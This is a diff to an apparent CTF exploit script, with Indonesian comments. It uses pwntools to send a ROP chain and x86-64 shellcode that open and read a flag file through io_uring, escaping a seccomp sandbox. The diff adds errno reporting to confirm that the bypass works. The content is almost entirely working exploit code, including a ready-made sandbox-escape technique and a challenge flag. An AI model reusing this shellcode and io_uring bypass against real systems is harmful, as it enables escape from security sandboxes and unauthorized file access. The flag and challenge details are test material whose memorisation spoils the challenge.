@@ -123,7 +123,15 @@ sc = asm(f"""
         shl eax, 4
         mov r12d, [rdx+rax+8]
 
-        test r12d, r12d                  /* gagal -> keluar */
+        mov rax, {BUF}-16                /* selalu kirim cqe.res dulu (8 byte) */
+        mov [rax], r12
+        mov edi, 1
+        mov rsi, {BUF}-16
+        mov edx, 8
+        mov eax, 1
+        syscall
+
+        test r12d, r12d                  /* openat gagal -> berhenti di sini */
         js keluar
 
         mov edi, r12d                    /* read(fd, BUF, 0x200)  - diizinkan */
@@ -161,6 +169,17 @@ io.send(rop);                        time.sleep(0.4)
 io.send(sc);                         time.sleep(0.4)
 io.send(FLAGPATH.encode() + b"\x00")
 
-isi = io.recvall(timeout=5).decode(errors="replace").strip()
-print(f"[4] {FLAGPATH} -> {isi!r}")
-print(f"\nFLAG : TechtonicExpoCTF{{{isi}_66394FFC}}")
+res = u64(io.recvn(8, timeout=5))
+if res >> 31 & 1: res -= 1 << 32
+ERR = {2: "ENOENT (tidak ada)", 13: "EACCES (tidak boleh dibaca)",
+       20: "ENOTDIR (ada, tapi bukan direktori)", 21: "EISDIR (ini direktori)"}
+
+if res < 0:
+    print(f"[4] openat({FLAGPATH}) -> gagal, errno {-res} = {ERR.get(-res, '?')}")
+    print("    (errno asli kembali = bypass io_uring JALAN; kalau seccomp memblokir,")
+    print("     proses akan dibunuh KILL_THREAD, bukan mengembalikan errno)")
+else:
+    isi = io.recvall(timeout=5).decode(errors="replace").strip()
+    print(f"[4] openat({FLAGPATH}) -> fd {res}, isi = {isi!r}")
+    if FLAGPATH == "/srv/rahasia.txt":
+        print(f"\nFLAG : TechtonicExpoCTF{{{isi}_66394FFC}}")
